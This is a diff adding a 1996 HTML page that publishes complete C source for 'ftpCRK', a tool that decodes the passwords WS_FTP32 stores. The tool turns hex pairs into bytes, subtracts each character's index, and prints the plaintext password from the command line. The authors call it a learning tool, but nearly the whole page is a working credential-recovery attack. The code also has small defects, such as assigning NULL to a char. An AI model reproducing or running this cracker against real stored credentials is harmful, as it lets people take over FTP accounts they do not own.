@@ -1,0 +1,149 @@
+<TITLE>WS_FTP32 Pasword Encryption Defeated Source Code</TITLE>
+<BODY BACKGROUND="gb1.jpg" TEXT="#00FFFF" LINK="#FFFF00" VLINK="#BBBB00">
+<CENTER>
+  <H1>
+<hr size=1>
+    <I>C Source Code to defeating WS_FTP32 Passwords</I><BR>
+<hr size=1>
+  </H1>
+</CENTER>
+<PRE>
+/*
+    This source code contains routines to defeat WS_FTP password
+    encryption.  It is meant this source code to be used as a
+    learning tool and not a cracking tool.  It is meant to show
+    that false sense of security is worse than no security.
+
+    *BorlandC 3.1 was used to compile this successfully.
+
+    It is a crime to redistribute these routines in a commercial
+    venture of any kind without permission or licensing agreement.
+
+    (C)opyright 1996 Damaged Cybernetics
+
+    If you have any questions or comments, please contact the
+    following ppl via the Internet:
+
+        Donald Moore   (MindRape) mindrape@goodnet.com
+        Donald Staheli (Royce)     staheli@goodnet.com
+
+        Web Page: www.goodnet.com/~staheli
+
+ */
+#include <stdio.h>
+#include <stdlib.H>
+#include <string.h>
+
+/* Definitions for password validation */
+#define VALID_PASSWORD          0
+#define INVALID_PASSWORD_LENGTH 1
+
+/* WS_FTP password definitions */
+#define WSFTP_PASSWORD_MAXLENGTH 78
+
+/* prototypes */
+char StrHex2Dec(char cHex);
+char CrackWSFTP(char *szPassword,char * szCrackedPassword);
+void help(void);
+
+/*
+   char StrHex2Dec(char cHex)
+   ENT: char cHex - Some Hex value
+   RET: decimal value
+
+   Convert a string representation of a HEX value to a decimal value.
+ */
+char StrHex2Dec(char cHex)
+{   char cAdd = 0;
+
+    if (cHex > 64) cAdd = 9;   /* if character is A or so we need to add 9 */
+
+    /* now do a Logical AND against the value, this will cause the value to
+       wrap around 0-15.  If the character contained A-F, it will add 9 to
+       get the correct 10s position value.
+     */
+    return(cHex & 15) + cAdd;
+}
+
+
+/*
+   char *CrackWSFTP(char *szPassword,char *szCrackedPassword)
+   ENT: char *szPassword - Password to decrypt
+        char *szCrackedPassword - preallocated string to WSFTP_PASSWORD_MAXLENGTH
+                                  to hold the decrypted password.
+   RET: INVALID_PASSWORD_LENGTH - password has incorrect length
+        VALID_PASSWORD          - this was a valid password
+
+   This routine will decrypt WSFTP32 encrypted passwords.  This routine was
+   meant to be written for simplicity of understand how to crack passwords, so
+   it can be optimized greatly for string pointer manipulations.
+
+ */
+char CrackWSFTP(char *szPassword,char *szCrackedPassword)
+{ char szCrackedPW[WSFTP_PASSWORD_MAXLENGTH+1]; /* Keep track of our decrypted password */
+  int i;                                        /* loop counter                         */
+  int iIndex = 0;                               /* keep track of our index              */
+
+  /* Passwords must be evenly divisible! */
+  if (strlen(szPassword) % 2)
+    return(INVALID_PASSWORD_LENGTH);
+
+ /* make sure the password is the correct length */
+ if (strlen(szPassword) < 1 || strlen(szPassword) > WSFTP_PASSWORD_MAXLENGTH)
+   return(INVALID_PASSWORD_LENGTH);
+
+  for (i=0;i < strlen(szPassword);i+=2)
+    {
+      /* cat 2 hex values into one hex value, then subtract it's index
+         in the string from itself to produce the correct ASCII character
+       */
+      szCrackedPassword[iIndex] = ((StrHex2Dec(szPassword[i]) << 4) |
+                       (StrHex2Dec(szPassword[i+1])))  - iIndex;
+      /* now increment our iIndex */
+      iIndex++;
+    }
+
+ /* append a null so our string is terminated */
+ szCrackedPassword[iIndex] = NULL;
+
+ return(VALID_PASSWORD);
+};
+
+void help()
+{
+  puts("\nThis program will defeat WS_FTP32 password encryption.\n\n"
+       "Usage: ftpCRK <password>\n"
+       "  i.e. ftpCRK 6162636465\n"
+      );
+};
+
+void main(int argc,char *argv[])
+{
+char szCrackedPassword[WSFTP_PASSWORD_MAXLENGTH];
+
+  puts("WS_FTP32 Cracker - (C) 1996 Damaged Cybernetics (www.goodnet.com/~staheli)");
+  if (argc != 2)
+    {
+      help();
+      exit(0);
+    }
+
+  switch (CrackWSFTP(argv[1],szCrackedPassword))
+    {
+      case INVALID_PASSWORD_LENGTH:printf("Password has incorrect length.\n");
+                                   break;
+      case VALID_PASSWORD:printf("The password is: %s\n",szCrackedPassword);
+    };
+
+}
+</PRE>
+<FONT SIZE=3>
+<CENTER>
+<hr size=1>
+  &copy; 1995 Damaged Cybernetics
+  <P>
+</CENTER>
+</FONT>
+<P>
+</HTML>
+
